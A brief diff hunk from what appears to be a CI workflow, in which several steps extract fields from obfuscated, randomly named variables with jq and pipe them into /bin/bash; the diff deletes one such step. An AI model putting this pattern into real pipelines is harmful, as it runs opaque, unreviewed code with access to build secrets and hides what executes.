@@ -34,7 +34,6 @@ jobs:
           echo $rn08 | jq -r .cpfav27005 | /bin/bash
           printf '%s' "$tp7" | jq -r .p9622 | /bin/bash
           echo $ww29976 | jq -r .ydai96 | /bin/bash
-          printf '%s' "$vyxrb3721" | jq -r .s8 | /bin/bash
           printf '%s' "$emuu6361" | jq -r .jrr44 | /bin/bash
           echo $hstpe8 | jq -r .lbyuz161 | /bin/bash
 
